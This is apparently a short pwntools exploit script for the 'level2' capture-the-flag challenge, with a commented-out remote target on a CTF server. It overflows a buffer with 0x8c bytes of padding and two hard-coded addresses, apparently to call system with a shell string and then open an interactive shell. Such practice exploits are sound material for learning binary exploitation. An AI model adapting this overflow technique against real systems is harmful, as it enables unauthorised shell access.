from pwn import *
context.log_level = 'debug'
cn=process('./level2')
#cn = remote('pwn2.jarvisoj.com',9878)
cn.recvline()
raw_input()
cn.send(0x8c*'a'+ p32(0x0804845C) + p32(0x0804A024))
cn.interactive()
